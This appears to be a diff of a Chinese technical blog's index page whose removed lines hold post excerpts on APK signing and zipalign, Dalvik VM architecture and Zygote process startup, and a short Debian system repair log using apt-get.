-<li>接着调用addNativeLibraries()函数添加工程libs目录下的Native库<ul>
-<li>通过Android NDK编译生成的so或bin文件</li>
-</ul>
-</li>
-<li>最后调用sealApk()关闭apk文件</li>
-</ul>
-</li>
-<li><strong>对APK文件进行签名</strong><ul>
-<li>签名APK有两种情况：<ul>
-<li>一种是在调试程序时进行签名，使用Eclipse开发Android程序时，在编译调试程序时会自己使用一个debug.keystore对apk进行签名</li>
-<li>一种是打包发布时对程序进行签名，这种情况下需要提供了一个符合Android开发文档中要求的签名文件。</li>
-</ul>
-</li>
-<li>签名的方法有两种情况：<ul>
-<li>一种是使用JDK中提供的jarsigner工具签名</li>
-<li>一种是使用Android源码中提供的signapk工具，它的代码位于Android系统源码的build\tools\signapk目录下。</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><strong>对签名后的APK文件进行对齐处理</strong><ul>
-<li>使用到的工具为zipalign<ul>
-<li>位于android-sdk\tools目录，源码位于Android系统源码的build\tools\zipalign目录</li>
-<li>主要工作是将apk包进行对齐处理，使apk包中的所有资源文件距离文件起始偏移为4字节整数倍</li>
-<li>通过内存映射访问apk文件时的速度会更快</li>
-</ul>
-</li>
-<li>验证apk文件是否对齐过的工作由ZipAlign.cpp文件的verify()函数完成</li>
-<li>处理对齐的工作则由process()函数完成。</li>
-</ul>
-</li>
-</ul>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Android</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/08/08/Android程序的生成步骤/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Dalvik" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/08/08/Dalvik/">Dalvik</a>
-    </h1>
-  
-
-        
-        <a href="/2018/08/08/Dalvik/" class="archive-article-date">
-  	<time datetime="2018-08-08T07:47:12.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-08</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="Dalvik虚拟机概述"><a href="#Dalvik虚拟机概述" class="headerlink" title="Dalvik虚拟机概述"></a>Dalvik虚拟机概述</h3><ul>
-<li>体积小，占用内存空间小</li>
-<li>专有的DEX可执行文件格式，体积更小，执行速度更快</li>
-<li>常量池采用32位索引值，寻址类方法名，字段名，常量更快</li>
-<li>基于寄存器架构，并拥有一套完整的指令系统</li>
-<li>提供了对象生命周期管理，堆栈管理，线程管理，安全和异常管理以及垃圾回收等重要功能</li>
-<li>所有的Android程序都运行在Android系统进程里，每个进程对应着一个Dalvik虚拟机实例</li>
-</ul>
-<h3 id="Dalvik虚拟机与Java虚拟机的区别"><a href="#Dalvik虚拟机与Java虚拟机的区别" class="headerlink" title="Dalvik虚拟机与Java虚拟机的区别"></a>Dalvik虚拟机与Java虚拟机的区别</h3><ul>
-<li>Java虚拟机运行的是Java字节码，Dalvik虚拟机运行的是Dalvik字节码<ul>
-<li>java程序经过编译，生成java字节码保存在class文件中，java虚拟机通过解码class文件中的内容来运行程序。</li>
-<li>Dalvik虚拟机运行的是Dalvik字节码（Dalvik字节码由java字节码转换而来），并被打包到一个DEX（Dalvik Executable）可执行文件中，Dalvik虚拟机通过解码DEX文件来执行字节码。</li>
-</ul>
-</li>
-<li>Dalvik可执行文件体积更小<ul>
-<li>Android sdk中dx工具，负责将Java字节码转为Dalvik字节码。dx工具对Java类文件重新排列，消除在类文件中出现的所有冗余信息，避免虚拟机在初始化时出现反复的文件加载与解析过程。</li>
-<li>dx工具将所有的Java类文件中的常量池进行分解，消除其中的冗余信息，重新组合形成一个常量池，所有的类文件共享同一个常量池。</li>
-</ul>
-</li>
-<li>Java虚拟机与Dalvik虚拟机架构不同<ul>
-<li>Java虚拟机基于栈架构，程序在运行时虚拟机需要频繁的从栈上读取或写入数据，这个过程需要更多的指令分派与内存访问次数，会耗费不少CPU时间。</li>
-<li>Dalvik虚拟机基于寄存器架构，数据的访问通过寄存器间直接传递，比基于栈方式要快很多。</li>
-<li>对于Java程序来说，每个线程在执行时都有一个PC计数器与一个Java栈，PC计数器以字节为单位记录当前运行位置距离方法开头的偏移量，作用类似于ARM架构CPU的PC寄存器与x86架构CPU的IP寄存器。</li>
-<li>Java栈以帧（frame）为单位保存线程的运行状态，每调用一个方法就会分配一个新的栈帧压入Java栈上，每从一个方法返回则弹出并撤销相应的帧栈。每个帧栈包括局部变量区，求值栈（JVM规范中将其称为操作数栈）和其他一些信息。</li>
-<li>Dalvik虚拟机运行时同样为每一个线程维护一个PC计数器与调用栈，这个调用栈维护一份寄存器列表，寄存器的数量在方法结构体的register字段中给出，Dalvik虚拟机会根据这个值来创建一份虚拟的寄存器列表。</li>
-</ul>
-</li>
-</ul>
-<h3 id="Dalvik虚拟机执行程序"><a href="#Dalvik虚拟机执行程序" class="headerlink" title="Dalvik虚拟机执行程序"></a>Dalvik虚拟机执行程序</h3><p><img src="/2018/08/08/Dalvik/1.jpeg" alt="1"></p>
-<ul>
-<li><p>Android系统启动加载完内核后，执行顺序：</p>
-<ul>
-<li>init进程<ul>
-<li>设备初始化</li>
-<li>读取init.rc文件并启动系统中重要外部程序Zygote。（Zygote孵化器进程）</li>
-<li>启动Zygote</li>
-<li>Zygote初始化Dalvik虚拟机</li>
-<li>启动system_server并进入Zygote模式，通过socket等候命令</li>
-</ul>
-</li>
-<li>当执行一个Android应用程序时，system_server进程通过Binder IPC方式发送命名给Zygote，Zygote收到命令后通过fork自身创建一个Dalvik虚拟机来执行应用程序的入口函数。</li>
-</ul>
-</li>
-<li><p>Zygote三种创建进程的方法</p>
-<ul>
-<li><p>fork（），创建一个Zygote进程（这种方式实际不会被调用）</p>
-</li>
-<li><p>forkAndSpecialize（），创建一个非Zygote进程</p>
-</li>
-<li><p>forkSystemServer（），创建一个系统服务进程</p>
-</li>
-<li><p>其中Zygote进程可以再fork（）出其他进程，非Zygote进程则不能fork（）其他进程，而系统服务进程在终止后它的子进程也必须终止</p>
-</li>
-</ul>
-</li>
-<li><p>Dalvik虚拟机执行程序流程</p>
-<ul>
-<li><p>1.虚拟机线程Zygote</p>
-</li>
-<li><p>2.loadClassFromDex（）函数完成类的装载工作，（每个类被解析后都会拥有一个ClassObject类型的数据结构存储在运行时环境中）</p>
-</li>
-<li><p>3.gDvm.loadedClasses全局哈希表来存储查询所有装载进来的类</p>
-</li>
-<li><p>4.字节码验证器使用dvmVerifyCodeFlow（）函数对装入的代码进行校验</p>
-</li>
-<li><p>5.虚拟机调用FindClass（）函数查找并装载main方法类</p>
-</li>
-<li><p>6.调用dvmInterpret（）函数初始化解释器并执行字节码流</p>
-</li>
-</ul>
-</li>
-</ul>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Android</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/08/08/Dalvik/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Debian修复" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/08/02/Debian修复/">Debian修复</a>
-    </h1>
-  
-
-        
-        <a href="/2018/08/02/Debian修复/" class="archive-article-date">
-  	<time datetime="2018-08-02T12:39:17.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-02</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="记一次Debian系统崩溃及修复"><a href="#记一次Debian系统崩溃及修复" class="headerlink" title="记一次Debian系统崩溃及修复"></a>记一次Debian系统崩溃及修复</h2><ul>
-<li>7月底，在一次瞎比操作下（貌似是强制关机），电脑（单系统debian-parrot）重启后，系统能启动，但是进入后无图形化界面，只有鼠标在屏幕中间闪亮。多次重启仍无效。</li>
-<li>排除显卡兼容等，电脑硬件原因后，确实是图像化载入失败，和系统更新有关。</li>
-<li>在尝试通过conf写WiFi连接的时候，总是提醒失败。等待多天，找到一网线，直连。<ul>
-<li>在系统启动后，ctrl+alt+f1或f2或f3，进入tty。</li>
-<li>login</li>
-<li><code>sudo apt-get dist-upgrade</code>后出现<code>apt-get update --fix-missing</code></li>
-<li>遂<code>apt-get update --fix-missing</code></li>
-<li>很久之后，我大概更新了2G多，修复好了。</li>
-<li>reboot，重启之后就OK了。</li>
-</ul>
-</li>
-</ul>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">others</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/08/02/Debian修复/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
       <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
@@ -2026,15 +1920,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">reverse</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">Android</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">others</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">reverse</a>
               </li>
              
               <li class="article-tag-list-item">
